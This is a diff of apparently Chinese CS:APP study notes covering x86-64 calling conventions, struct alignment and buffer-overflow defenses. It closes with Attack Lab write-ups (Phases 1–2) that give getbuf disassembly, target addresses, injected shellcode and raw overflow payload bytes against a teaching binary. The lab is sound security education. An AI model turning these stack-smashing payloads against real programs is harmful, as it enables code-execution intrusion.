-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca3cc6ca6c.png" style="transform: scale(1)" width=1548 height=144></div>
-浮点运算主要会设置 <code>ZF</code>、<code>CF</code> 和 <code>PF</code>，设置条件如下：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca3a7495c8.png" style="transform: scale(1)" width=770 height=234></div></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca3cc6ca6c.png" style="transform: scale(1)" width=1548 height=144></div></p>
+<p>浮点运算主要会设置 <code>ZF</code>、<code>CF</code> 和 <code>PF</code>，设置条件如下：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca3a7495c8.png" style="transform: scale(1)" width=770 height=234></div></p>
 <h2 id="han-shu-tiao-yong" tabindex="-1">函数调用</h2>
 <h3 id="ya-zhan-dan-zhan-zhi-ling" tabindex="-1">压栈弹栈指令</h3>
-<p><code>%rsp</code> 寄存器存放当前栈顶地址
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c40e130320.png" style="transform: scale(1)" width=875 height=291></div></p>
+<p><code>%rsp</code> 寄存器存放当前栈顶地址</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c40e130320.png" style="transform: scale(1)" width=875 height=291></div></p>
 <h3 id="tiao-yong-fan-hui-zhi-ling" tabindex="-1">调用返回指令</h3>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c412f3cc58.png" style="transform: scale(1)" width=693 height=214></div>
-其中 <code>call</code> 指令会首先把当前 PC （即下一条指令的地址）压入栈中，用来后续返回，然后将 PC 置为要调用的函数的地址
-<code>ret</code> 指令会从栈中弹出一个值（编译器需要确保执行 <code>ret</code> 时已经弹栈到返回地址处了），然后将 PC 置为这个值</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c412f3cc58.png" style="transform: scale(1)" width=693 height=214></div></p>
+<p>其中 <code>call</code> 指令会首先把当前 PC （即下一条指令的地址）压入栈中，用来后续返回，然后将 PC 置为要调用的函数的地址</p>
+<p><code>ret</code> 指令会从栈中弹出一个值（编译器需要确保执行 <code>ret</code> 时已经弹栈到返回地址处了），然后将 PC 置为这个值</p>
 <h3 id="can-shu-he-fan-hui-zhi" tabindex="-1">参数和返回值</h3>
-<p>返回值放在 <code>%rax</code> 寄存器中，如果返回值是浮点数，则会放在 <code>%xmm0</code>
-传递参数时，前 6 个参数通过寄存器传递，使用寄存器的规则如下：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c42ea0d6dc.png" style="transform: scale(1)" width=1263 height=369></div>
-多余 6 个的参数会直接压入栈中
-对于浮点数参数，前 8 个浮点数参数会使用 <code>%xmm0</code> 到 <code>%xmm7</code> 传递，剩余的会压入栈中
-压入栈中的时候，无论是 8 位 16 位还是 32 位，都占用 64 位的栈空间
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c44d1c6d0a.png" style="transform: scale(1)" width=810 height=1201></div>
-注意第七个函数位置是 <code>%rsp+8</code>，因为 <code>%rsp</code> 的位置上是 <code>call</code> 指令压入的返回值地址</p>
+<p>返回值放在 <code>%rax</code> 寄存器中，如果返回值是浮点数，则会放在 <code>%xmm0</code></p>
+<p>传递参数时，前 6 个参数通过寄存器传递，使用寄存器的规则如下：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c42ea0d6dc.png" style="transform: scale(1)" width=1263 height=369></div></p>
+<p>多余 6 个的参数会直接压入栈中</p>
+<p>对于浮点数参数，前 8 个浮点数参数会使用 <code>%xmm0</code> 到 <code>%xmm7</code> 传递，剩余的会压入栈中</p>
+<p>压入栈中的时候，无论是 8 位 16 位还是 32 位，都占用 64 位的栈空间</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c44d1c6d0a.png" style="transform: scale(1)" width=810 height=1201></div></p>
+<p>注意第七个函数位置是 <code>%rsp+8</code>，因为 <code>%rsp</code> 的位置上是 <code>call</code> 指令压入的返回值地址</p>
 <h3 id="ji-cun-qi-1" tabindex="-1">寄存器</h3>
-<p>为了确保调用一个函数前后，被调用的函数不会覆盖调用函数稍后会使用的寄存器值，我们需要有一个约定。一些寄存器是需要调用者进行提前保存的，一些寄存器是需要被调用者保存的。
-我们假设现在是函数 A 调用了函数 B
-<code>%rbx</code>、<code>%rbp</code>、<code>%r12</code> ~ <code>%r15</code> 被划分为被调用者保存寄存器。函数 B 需要确保自己执行前后这些寄存器的值不变。函数 B 要么根本不去动这些寄存器，要么先把这些寄存器的值压入栈中，返回时再恢复。这样，函数 A 可以在调用 B 前放心地把数据存到这些寄存器上
-上述以外的寄存器（<code>%rsp</code> 除外）被划分为调用者保存寄存器，包括 ymm 和 xmm 这些寄存器。任何函数都可以随意使用这些寄存器，如果函数 A 需要确保这些寄存器在调用函数 B 后不变的话，需要自行保存</p>
+<p>为了确保调用一个函数前后，被调用的函数不会覆盖调用函数稍后会使用的寄存器值，我们需要有一个约定。一些寄存器是需要调用者进行提前保存的，一些寄存器是需要被调用者保存的。</p>
+<p>我们假设现在是函数 A 调用了函数 B</p>
+<p><code>%rbx</code>、<code>%rbp</code>、<code>%r12</code> ~ <code>%r15</code> 被划分为被调用者保存寄存器。函数 B 需要确保自己执行前后这些寄存器的值不变。函数 B 要么根本不去动这些寄存器，要么先把这些寄存器的值压入栈中，返回时再恢复。这样，函数 A 可以在调用 B 前放心地把数据存到这些寄存器上</p>
+<p>上述以外的寄存器（<code>%rsp</code> 除外）被划分为调用者保存寄存器，包括 ymm 和 xmm 这些寄存器。任何函数都可以随意使用这些寄存器，如果函数 A 需要确保这些寄存器在调用函数 B 后不变的话，需要自行保存</p>
 <h2 id="shu-ju-jie-gou" tabindex="-1">数据结构</h2>
 <h3 id="tiao-biao" tabindex="-1">跳表</h3>
-<p>对于 switch 语句，如果判断的情况比较少的时候可能会直接展开成 if 语句，如果判断的情况比较多，且判断的值范围跨度比较小的时候，就会使用跳表
-比如：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3c7d4548b.png" style="transform: scale(1)" width=515 height=1094></div>
-会编译成：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3caedd6c2.png" style="transform: scale(1)" width=896 height=819></div>
-其中，L4 是位于 rodata 段的数据：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3d5f2cdd5.png" style="transform: scale(1)" width=810 height=380></div>
-换成 C 语言代码就是：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3cf84d3f0.png" style="transform: scale(1)" width=650 height=1249></div>
-其中 <code>&amp;&amp;</code> 表示获取某个代码位置的地址
-大概就是把 switch 判断的值映射到一个比较小的值上面，然后以映射后的值作为下标直接从数组中获取跳转地址。这种带来的好处就是无论需要判断的情况有多少，执行 switch 指令的时间都是一样的</p>
+<p>对于 switch 语句，如果判断的情况比较少的时候可能会直接展开成 if 语句，如果判断的情况比较多，且判断的值范围跨度比较小的时候，就会使用跳表</p>
+<p>比如：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3c7d4548b.png" style="transform: scale(1)" width=515 height=1094></div></p>
+<p>会编译成：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3caedd6c2.png" style="transform: scale(1)" width=896 height=819></div></p>
+<p>其中，L4 是位于 rodata 段的数据：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3d5f2cdd5.png" style="transform: scale(1)" width=810 height=380></div></p>
+<p>换成 C 语言代码就是：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3cf84d3f0.png" style="transform: scale(1)" width=650 height=1249></div></p>
+<p>其中 <code>&amp;&amp;</code> 表示获取某个代码位置的地址</p>
+<p>大概就是把 switch 判断的值映射到一个比较小的值上面，然后以映射后的值作为下标直接从数组中获取跳转地址。这种带来的好处就是无论需要判断的情况有多少，执行 switch 指令的时间都是一样的</p>
 <h3 id="duo-wei-shu-zu" tabindex="-1">多维数组</h3>
-<p>多维数组在内存中的排列规则是，最后一个下标的元素连续，比如：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c4b6086eeb.png" style="transform: scale(1)" width=383 height=603></div></p>
+<p>多维数组在内存中的排列规则是，最后一个下标的元素连续，比如：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c4b6086eeb.png" style="transform: scale(1)" width=383 height=603></div></p>
 <h3 id="bian-chang-shu-zu" tabindex="-1">变长数组</h3>
-<p>ISO C99 引入了变长数组这一特性，允许声明数组时数组长度为变量
-数组长度无法在编译期获知的话，可能会使得函数在返回时不好清理当前栈帧。为了管理变长栈帧，x86-64 使用 <code>%rbp</code> 这个寄存器存储当前的栈顶地址。由于 <code>%rbp</code> 是被调用者保存寄存器，需要先压入栈中。比如：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c91c86b404.png" style="transform: scale(1)" width=1172 height=369></div>
-对应汇编：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c920762852.png" style="transform: scale(1)" width=1153 height=1118></div>
-运行时栈上的情况为：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c923555b3d.png" style="transform: scale(1)" width=603 height=567></div>
-当函数返回之前，会执行一个 <code>leave</code> 指令，该指令不需要操作数，等价于下面两条指令：</p>
+<p>ISO C99 引入了变长数组这一特性，允许声明数组时数组长度为变量</p>
+<p>数组长度无法在编译期获知的话，可能会使得函数在返回时不好清理当前栈帧。为了管理变长栈帧，x86-64 使用 <code>%rbp</code> 这个寄存器存储当前的栈顶地址。由于 <code>%rbp</code> 是被调用者保存寄存器，需要先压入栈中。比如：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c91c86b404.png" style="transform: scale(1)" width=1172 height=369></div></p>
+<p>对应汇编：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c920762852.png" style="transform: scale(1)" width=1153 height=1118></div></p>
+<p>运行时栈上的情况为：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c923555b3d.png" style="transform: scale(1)" width=603 height=567></div></p>
+<p>当函数返回之前，会执行一个 <code>leave</code> 指令，该指令不需要操作数，等价于下面两条指令：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="bW92cSUyMCUyNXJicCUyQyUyNXJzcCUwQXBvcHElMjAlMjVyYnAlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div></div><div class="code">movq %rbp,%rsp
 popq %rbp
 </div></code></pre>
 <p>即会直接把 <code>%rsp</code> 置为栈顶来清栈，然后恢复 <code>%rbp</code></p>
 <h3 id="jie-gou-ti" tabindex="-1">结构体</h3>
-<p>结构体可能包含多种数据类型。为了提高内存读写效率，数据之间需要进行对齐。对齐原则是任何 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 字节的基本对象的地址必须是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 的倍数
-比如：</p>
+<p>结构体可能包含多种数据类型。为了提高内存读写效率，数据之间需要进行对齐。对齐原则是任何 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 字节的基本对象的地址必须是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 的倍数</p>
+<p>比如：</p>
 <ul>
-<li><code>struct P1 {int i;char c;int j;char d;};</code>
-| 偏移 | 0        | 4                | 8        | 12               | 16  | 对齐 |
-| ---- | -------- | ---------------- | -------- | ---------------- | --- | ---- |
-| 内容 | <code>int i;</code> | <code>char c;</code> + 填充 | <code>int j;</code> | <code>char d;</code> + 填充 |     | 4    |
-注意最后大小不是 9，<code>d</code> 后面还有 3 字节的填充。这么做是因为我们希望做到 <code>P1</code> 类型后面再跟一个 <code>P1</code> 类型的话，后面 <code>P1</code> 类型的第一个成员也满足对齐</li>
-<li><code>struct P2 {int i;char c;char d;long j;};</code>
-| 偏移 | 0        | 4         | 5                | 8         | 16  | 对齐 |
-| ---- | -------- | --------- | ---------------- | --------- | --- | ---- |
-| 内容 | <code>int i;</code> | <code>char c;</code> | <code>char d;</code> + 填充 | <code>long j;</code> |     | 8    |</li>
-<li><code>struct P3 {short w[3];char c[3];};</code>
-| 偏移 | 0             | 6                   | 10  | 对齐 |
-| ---- | ------------- | ------------------- | --- | ---- |
-| 内容 | <code>short w[3];</code> | <code>char c[3];</code> + 填充 |     | 2    |
-这个例子最后的填充说明，数组需要对齐的倍数为数组元素的大小而并非整个数组的大小</li>
-<li><code>struct P4 {short w[5];char *c[3];};</code>
-| 偏移 | 0                    | 16           | 40  | 对齐 |
-| ---- | -------------------- | ------------ | --- | ---- |
-| 内容 | <code>short w[5];</code> + 填充 | <code>char c[3];</code> |     | 8    |</li>
-<li><code>struct P5 {struct P3 a[2];struct P2 t;};</code>
-| 偏移 | 0                        | 24             | 40  | 对齐 |
-| ---- | ------------------------ | -------------- | --- | ---- |
-| 内容 | <code>struct P3 a[2];</code> + 填充 | <code>struct P2 t;</code> |     | 8    |
-对于结构体，我们需要把结构体作为一个大的类型看。结构体的对齐并非是结构体的大小了，而是结构体成员中的对齐的最大值。结构体作为成员时，起始地址应该是其对齐的倍数。这么做的原因是，1 2 4 8 这四个数，后面的数字都是前面的数字的倍数，比如按 8 对齐之后自然满足按 2 对齐，但是按 2 对齐后未必能是按 8 对齐的，所以我们要取对齐的最大值</li>
+<li><code>struct P1 {int i;char c;int j;char d;};</code></li>
 </ul>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>0</th>
+<th>4</th>
+<th>8</th>
+<th>12</th>
+<th>16</th>
+<th>对齐</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内容</td>
+<td><code>int i;</code></td>
+<td><code>char c;</code> + 填充</td>
+<td><code>int j;</code></td>
+<td><code>char d;</code> + 填充</td>
+<td></td>
+<td>4</td>
+</tr>
+</tbody>
+</table>
+<p>注意最后大小不是 9，<code>d</code> 后面还有 3 字节的填充。这么做是因为我们希望做到 <code>P1</code> 类型后面再跟一个 <code>P1</code> 类型的话，后面 <code>P1</code> 类型的第一个成员也满足对齐</p>
+<ul>
+<li><code>struct P2 {int i;char c;char d;long j;};</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>0</th>
+<th>4</th>
+<th>5</th>
+<th>8</th>
+<th>16</th>
+<th>对齐</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内容</td>
+<td><code>int i;</code></td>
+<td><code>char c;</code></td>
+<td><code>char d;</code> + 填充</td>
+<td><code>long j;</code></td>
+<td></td>
+<td>8</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>struct P3 {short w[3];char c[3];};</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>0</th>
+<th>6</th>
+<th>10</th>
+<th>对齐</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内容</td>
+<td><code>short w[3];</code></td>
+<td><code>char c[3];</code> + 填充</td>
+<td></td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<p>这个例子最后的填充说明，数组需要对齐的倍数为数组元素的大小而并非整个数组的大小</p>
+<ul>
+<li><code>struct P4 {short w[5];char *c[3];};</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>0</th>
+<th>16</th>
+<th>40</th>
+<th>对齐</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内容</td>
+<td><code>short w[5];</code> + 填充</td>
+<td><code>char c[3];</code></td>
+<td></td>
+<td>8</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>struct P5 {struct P3 a[2];struct P2 t;};</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>0</th>
+<th>24</th>
+<th>40</th>
+<th>对齐</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>内容</td>
+<td><code>struct P3 a[2];</code> + 填充</td>
+<td><code>struct P2 t;</code></td>
+<td></td>
+<td>8</td>
+</tr>
+</tbody>
+</table>
+<p>对于结构体，我们需要把结构体作为一个大的类型看。结构体的对齐并非是结构体的大小了，而是结构体成员中的对齐的最大值。结构体作为成员时，起始地址应该是其对齐的倍数。这么做的原因是，1 2 4 8 这四个数，后面的数字都是前面的数字的倍数，比如按 8 对齐之后自然满足按 2 对齐，但是按 2 对齐后未必能是按 8 对齐的，所以我们要取对齐的最大值</p>
 <h2 id="dui-kang-huan-chong-qu-yi-chu" tabindex="-1">对抗缓冲区溢出</h2>
 <h3 id="zhan-sui-ji-hua" tabindex="-1">栈随机化</h3>
-<p>如果要进行缓冲区攻击，那么就需要把恶意代码放到缓冲区中，同时我们还需要得知插入代码的地址。因此一个防范手段是，程序开始时就在栈上分配一段随机大小的空间，这样就相当于把栈的起始地址随机了，这样一来攻击者将很难得知插入的代码位于哪里
-一个解决手段是，将恶意代码前面加入若干 <code>nop</code> 指令，这种指令只会增加 PC 而不会有其他行为。这样，攻击者只需要猜对有 <code>nop</code> 指令的范围就可以了，跳到 <code>nop</code> 范围后程序将会沿着 <code>nop</code> 一直滑向恶意代码，对应的专业术语叫空操作雪橇（nop sled）</p>
+<p>如果要进行缓冲区攻击，那么就需要把恶意代码放到缓冲区中，同时我们还需要得知插入代码的地址。因此一个防范手段是，程序开始时就在栈上分配一段随机大小的空间，这样就相当于把栈的起始地址随机了，这样一来攻击者将很难得知插入的代码位于哪里</p>
+<p>一个解决手段是，将恶意代码前面加入若干 <code>nop</code> 指令，这种指令只会增加 PC 而不会有其他行为。这样，攻击者只需要猜对有 <code>nop</code> 指令的范围就可以了，跳到 <code>nop</code> 范围后程序将会沿着 <code>nop</code> 一直滑向恶意代码，对应的专业术语叫空操作雪橇（nop sled）</p>
 <h3 id="zhan-po-huai-jian-ce" tabindex="-1">栈破坏检测</h3>
-<p>GCC 会评估一个函数是否容易受到缓冲区攻击，并在缓冲区的上方防止一个特殊的数据，被称为金丝雀。在执行 <code>ret</code> 指令之前，GCC 会生成检查代码，检查这个金丝雀是否发生改变。如果改变的话说明缓冲区被攻击，会立刻终止程序
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c62481a095.png" style="transform: scale(1)" width=975 height=122></div>
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c625b0a060.png" style="transform: scale(1)" width=979 height=520></div>
-其中第 3 行获取金丝雀数据，第 13 行进行金丝雀检查
-编译时使用 <code>-fno-stack-protector</code> 参数可以禁止 GCC 进行栈破坏检测</p>
+<p>GCC 会评估一个函数是否容易受到缓冲区攻击，并在缓冲区的上方防止一个特殊的数据，被称为金丝雀。在执行 <code>ret</code> 指令之前，GCC 会生成检查代码，检查这个金丝雀是否发生改变。如果改变的话说明缓冲区被攻击，会立刻终止程序</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c62481a095.png" style="transform: scale(1)" width=975 height=122></div></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c625b0a060.png" style="transform: scale(1)" width=979 height=520></div></p>
+<p>其中第 3 行获取金丝雀数据，第 13 行进行金丝雀检查</p>
+<p>编译时使用 <code>-fno-stack-protector</code> 参数可以禁止 GCC 进行栈破坏检测</p>
 <h3 id="xian-zhi-ke-zhi-hang-dai-ma-qu-yu" tabindex="-1">限制可执行代码区域</h3>
 <p>可以在分页的时候限制执行权限</p>
 <h2 id="ming-ling-hang-gong-ju" tabindex="-1">命令行工具</h2>
-<p>产生汇编代码：<code>gcc -Og -S mstore.c</code>，其中 <code>-Og</code> 会使得编译器尽可能保持代码的整体结构，<code>-S</code> 说明生成汇编代码
-产生机器代码：<code>gcc -Og -c mstore.c</code>，<code>-c</code> 表示产生二进制的机器代码
-反汇编：<code>objdump -d mstore.o</code> 可以把上面产生的二进制机器码反汇编</p>
+<p>产生汇编代码：<code>gcc -Og -S mstore.c</code>，其中 <code>-Og</code> 会使得编译器尽可能保持代码的整体结构，<code>-S</code> 说明生成汇编代码</p>
+<p>产生机器代码：<code>gcc -Og -c mstore.c</code>，<code>-c</code> 表示产生二进制的机器代码</p>
+<p>反汇编：<code>objdump -d mstore.o</code> 可以把上面产生的二进制机器码反汇编</p>
 <h2 id="bomb-lab" tabindex="-1">Bomb Lab</h2>
 <p>写了几天的实验过程突然丢失了，等大二下学期正式学 CS 的时候再补（）</p>
 <h2 id="attack-lab" tabindex="-1">Attack Lab</h2>
 <h3 id="phase-1" tabindex="-1">Phase 1</h3>
-<p>我们需要进行一个缓冲区攻击，使得 getbuf 函数返回值直接跳到 touch1 函数
-大概的思路就是我们想办法把 getbuf 函数栈顶上方的返回值地址给篡改一下
-首先 <code>objdump -d ctarget &gt; disa.asm</code> 对 <code>ctarget</code> 来个反编译。touch1 函数在 <code>00000000004017c0</code> 地址处，getbuf 函数的反编译：</p>
+<p>我们需要进行一个缓冲区攻击，使得 getbuf 函数返回值直接跳到 touch1 函数</p>
+<p>大概的思路就是我们想办法把 getbuf 函数栈顶上方的返回值地址给篡改一下</p>
+<p>首先 <code>objdump -d ctarget &gt; disa.asm</code> 对 <code>ctarget</code> 来个反编译。touch1 函数在 <code>00000000004017c0</code> 地址处，getbuf 函数的反编译：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="MDAwMDAwMDAwMDQwMTdhOCUyMCUzQ2dldGJ1ZiUzRSUzQSUwQSUyMCUyMDQwMTdhOCUzQSUwOTQ4JTIwODMlMjBlYyUyMDI4JTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5c3ViJTIwJTIwJTIwJTIwJTI0MHgyOCUyQyUyNXJzcCUwQSUyMCUyMDQwMTdhYyUzQSUwOTQ4JTIwODklMjBlNyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOW1vdiUyMCUyMCUyMCUyMCUyNXJzcCUyQyUyNXJkaSUwQSUyMCUyMDQwMTdhZiUzQSUwOWU4JTIwOGMlMjAwMiUyMDAwJTIwMDAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDljYWxsJTIwJTIwJTIwNDAxYTQwJTIwJTNDR2V0cyUzRSUwQSUyMCUyMDQwMTdiNCUzQSUwOWI4JTIwMDElMjAwMCUyMDAwJTIwMDAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDltb3YlMjAlMjAlMjAlMjAlMjQweDElMkMlMjVlYXglMEElMjAlMjA0MDE3YjklM0ElMDk0OCUyMDgzJTIwYzQlMjAyOCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOWFkZCUyMCUyMCUyMCUyMCUyNDB4MjglMkMlMjVyc3AlMEElMjAlMjA0MDE3YmQlM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQSUyMCUyMDQwMTdiZSUzQSUwOTkwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5bm9wJTBBJTIwJTIwNDAxN2JmJTNBJTA5OTAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlub3AlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div></div><div class="code">00000000004017a8 &lt;getbuf&gt;:
   4017a8:	48 83 ec 28          	sub    $0x28,%rsp
   4017ac:	48 89 e7             	mov    %rsp,%rdi
@@ -297,13 +426,13 @@ c0 17 40 00 00 00 00 00
 </div></code></pre>
 <p>前面 40 字节无所谓，用来填充缓冲区，后面 8 字节构造了到 touch1 函数的地址，最后给个 0a 作为换行符结束输入</p>
 <h3 id="phase-2" tabindex="-1">Phase 2</h3>
-<p>这次我们需要让 getbuf 函数不仅跳转到 touch2 函数，还携带一个参数
-我们可能要考虑，先篡改 getbuf 栈顶上面的返回值地址，让其先指向我们自己的代码，然后我们去修改 <code>%rdi</code>，然后再跳到 touch2 函数
-一个困难之处在于可能栈地址是随机的，好在经过测试，<code>ctarget</code> 栈地址并没有随机。我们使用 gdb 在 getbuf 出打断点，并输出 <code>%rsp</code> 的值，为 <code>0x5561dca0</code>。一个注意地方是我们需要在 gdb 中先 <code>set args -q</code> 使得程序不连接评分服务器
-任务指导书中特别提示，我们最好不要使用 <code>jmp</code> 和 <code>call</code> 来进行跳转，因为这两个指令的编码可能会比较困难，建议我们使用 <code>ret</code> 指令，那我们可能需要考虑继续篡改 getbuf 栈顶再上面 8 个字节的地方（因为第一次从 getbuf 跳转后 <code>%rsp</code> 向上移动了 8 个字节）
-touch2 的地址为 <code>00000000004017ec</code>
-将指令变为二进制可以直接使用 gcc，如 <code>gcc -c example.s</code> 然后再 <code>objdump -d example.o &gt; example.d</code>
-先构造自己的代码：</p>
+<p>这次我们需要让 getbuf 函数不仅跳转到 touch2 函数，还携带一个参数</p>
+<p>我们可能要考虑，先篡改 getbuf 栈顶上面的返回值地址，让其先指向我们自己的代码，然后我们去修改 <code>%rdi</code>，然后再跳到 touch2 函数</p>
+<p>一个困难之处在于可能栈地址是随机的，好在经过测试，<code>ctarget</code> 栈地址并没有随机。我们使用 gdb 在 getbuf 出打断点，并输出 <code>%rsp</code> 的值，为 <code>0x5561dca0</code>。一个注意地方是我们需要在 gdb 中先 <code>set args -q</code> 使得程序不连接评分服务器</p>
+<p>任务指导书中特别提示，我们最好不要使用 <code>jmp</code> 和 <code>call</code> 来进行跳转，因为这两个指令的编码可能会比较困难，建议我们使用 <code>ret</code> 指令，那我们可能需要考虑继续篡改 getbuf 栈顶再上面 8 个字节的地方（因为第一次从 getbuf 跳转后 <code>%rsp</code> 向上移动了 8 个字节）</p>
+<p>touch2 的地址为 <code>00000000004017ec</code></p>
+<p>将指令变为二进制可以直接使用 gcc，如 <code>gcc -c example.s</code> 然后再 <code>objdump -d example.o &gt; example.d</code></p>
+<p>先构造自己的代码：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTIwJTIwJTIwJTIwbW92cSUyMCUyNDB4NTliOTk3ZmElMkMlMjAlMjVyZGklMEElMjAlMjAlMjAlMjByZXQlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div></div><div class="code">    movq $0x59b997fa, %rdi
     ret
 </div></code></pre>
@@ -334,34 +463,39 @@ FAIL: Would have posted the following:
         lab     attacklab
         result  1:FAIL:0xffffffff:ctarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 C3 98 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
 </div></code></pre>
